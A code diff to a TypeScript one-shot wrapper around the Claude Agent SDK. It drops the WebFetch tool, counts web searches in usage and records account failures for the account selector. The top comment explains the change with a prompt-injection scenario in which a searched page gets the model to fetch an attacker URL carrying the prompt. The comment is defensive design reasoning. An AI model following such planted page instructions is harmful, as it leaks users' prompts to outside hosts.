@@ -4,11 +4,17 @@
  * project's CLAUDE.md, settings or `.env` reaches it and nothing lands in the chat list. It
  * authenticates exactly as a turn does, through the env builder the provider passes in.
  *
- * Tools: none, unless `webSearch` asks for WebSearch + WebFetch (which take several turns).
+ * Tools: none, unless `webSearch` asks for WebSearch (which can take several turns). WebFetch
+ * is deliberately not offered: pre-approved for any URL, a page found by the search could ask
+ * for `https://attacker/?q=<the prompt>` and the prompt would leave the host unasked.
+ * WebSearch runs on Anthropic's side and fetches no URL the model names.
  * Structured output: `outputFormat: json_schema`. The SDK delivers it through an end-turn
  * tool call followed by a `structured_output` attachment, i.e. one tool round trip, so a call
  * with a schema gets three turns rather than one. Whether a real model answers within them is
  * not verified here; the caller validates the answer either way and falls back to the text.
+ *
+ * A refusal for the account (401, usage limit, rate limit) is handed to the account selector
+ * as a chat turn hands it, so the next pick moves on.
  */
 import { query, type Options } from "@anthropic-ai/claude-agent-sdk";
 import { mkdirSync } from "node:fs";
@@ -18,9 +24,12 @@ import { accountService, type AccountWithTokens } from "../services/account.serv
 import { getPpmDir } from "../services/ppm-dir.ts";
 import type { OneShotInput, OneShotResult } from "../types/chat.ts";
 import { OneShotError, type OneShotUsage } from "./one-shot-error.ts";
+import {
+  claudeAssistantProblem, claudeResultProblem, recordClaudeAccountProblem, type ClaudeAccountProblem,
+} from "./claude-one-shot-account-health.ts";
 
 export const CLAUDE_ONE_SHOT_DEFAULT_TIMEOUT_MS = 90_000;
-export const CLAUDE_WEB_TOOLS: readonly string[] = ["WebSearch", "WebFetch"];
+export const CLAUDE_WEB_TOOLS: readonly string[] = ["WebSearch"];
 const RATE_LIMIT_TEXT = /hit your (?:[\w-]+\s+)*limit|rate.?limit/i;
 
 /** What the provider lends the one-shot: how to authenticate and how to start the CLI. */
@@ -82,6 +91,17 @@ interface ResponseUsage {
   output_tokens?: number | null;
   cache_read_input_tokens?: number | null;
   cache_creation_input_tokens?: number | null;
+  server_tool_use?: { web_search_requests?: number | null } | null;
+}
+
+/** One response's usage in the one-shot's terms; web searches are billed apart from tokens. */
+function usageOf(u: ResponseUsage): OneShotUsage {
+  const webSearches = u.server_tool_use?.web_search_requests ?? 0;
+  return {
+    inputTokens: (u.input_tokens ?? 0) + (u.cache_read_input_tokens ?? 0) + (u.cache_creation_input_tokens ?? 0),
+    outputTokens: u.output_tokens ?? 0,
+    ...(webSearches > 0 && { webSearches }),
+  };
 }
 
 /** Tokens per API response; the SDK repeats a response's usage on each of its content blocks. */
@@ -89,17 +109,26 @@ class UsageTally {
   private byMessage = new Map<string, OneShotUsage>();
   add(message: { id?: string; usage?: ResponseUsage } | undefined): void {
     if (!message?.usage) return;
-    const u = message.usage;
-    this.byMessage.set(message.id ?? `m${this.byMessage.size}`, {
-      inputTokens: (u.input_tokens ?? 0) + (u.cache_read_input_tokens ?? 0) + (u.cache_creation_input_tokens ?? 0),
-      outputTokens: u.output_tokens ?? 0,
-    });
+    this.byMessage.set(message.id ?? `m${this.byMessage.size}`, usageOf(message.usage));
   }
   total(): OneShotUsage {
-    let inputTokens = 0, outputTokens = 0;
-    for (const u of this.byMessage.values()) { inputTokens += u.inputTokens; outputTokens += u.outputTokens; }
-    return { inputTokens, outputTokens };
+    let inputTokens = 0, outputTokens = 0, webSearches = 0;
+    for (const u of this.byMessage.values()) {
+      inputTokens += u.inputTokens; outputTokens += u.outputTokens; webSearches += u.webSearches ?? 0;
+    }
+    return { inputTokens, outputTokens, ...(webSearches > 0 && { webSearches }) };
   }
+}
+
+/** The error a failed result ends the call with, after the account's health is recorded. */
+function failure(
+  account: AccountWithTokens | null, problem: ClaudeAccountProblem | null, detail: string, usage: OneShotUsage,
+): OneShotError {
+  if (account && problem) recordClaudeAccountProblem(account.id, problem);
+  const text = `Claude did not answer: ${detail.slice(0, 200)}`;
+  if (problem?.kind === "auth") return new OneShotError("NO_ACCOUNT", text, { usage });
+  if (problem || RATE_LIMIT_TEXT.test(detail)) return new OneShotError("RATE_LIMITED", text, { usage });
+  return new OneShotError("PROVIDER_ERROR", text, { usage });
 }
 
 export async function claudeCompleteOnce(input: OneShotInput, ctx: ClaudeOneShotContext): Promise<OneShotResult> {
@@ -115,14 +144,14 @@ export async function claudeCompleteOnce(input: OneShotInput, ctx: ClaudeOneShot
   const onAbort = () => abortController.abort();
   input.signal?.addEventListener("abort", onAbort, { once: true });
   const tally = new UsageTally();
-  let rateLimited = false;
+  let problem: ClaudeAccountProblem | null = null;
   try {
     const options = buildClaudeOneShotOptions(input, ctx, { cwd, env: ctx.buildEnv(account), abortController });
     const run = (ctx.runQuery ?? query)({ prompt: input.prompt, options });
     for await (const message of run) {
       if (message.type === "assistant") {
         tally.add(message.message);
-        if ((message as { error?: string }).error === "rate_limit") rateLimited = true;
+        problem ??= claudeAssistantProblem(message);
         continue;
       }
       if (message.type !== "result") continue;
@@ -132,18 +161,14 @@ export async function claudeCompleteOnce(input: OneShotInput, ctx: ClaudeOneShot
         if (message.subtype === "error_max_structured_output_retries") {
           throw new OneShotError("BAD_JSON", "Claude gave no answer that fits the schema", { usage, raw: "" });
         }
-        if (rateLimited || RATE_LIMIT_TEXT.test(detail)) {
-          throw new OneShotError("RATE_LIMITED", `Claude did not answer: ${detail.slice(0, 200)}`, { usage });
-        }
-        throw new OneShotError("PROVIDER_ERROR", `Claude did not answer: ${detail.slice(0, 200)}`, { usage });
+        throw failure(account, problem ?? claudeResultProblem(message, detail), detail, usage);
       }
       if (account) accountSelector.onSuccess(account.id);
       const structured = (message as { structured_output?: unknown }).structured_output;
       return {
         text: message.result,
         ...(structured !== undefined && { structured }),
-        inputTokens: (message.usage.input_tokens ?? 0) + (message.usage.cache_read_input_tokens ?? 0) + (message.usage.cache_creation_input_tokens ?? 0),
-        outputTokens: message.usage.output_tokens ?? 0,
+        ...usageOf(message.usage as ResponseUsage),
         ...(account && { accountId: account.id }),
       };
     }
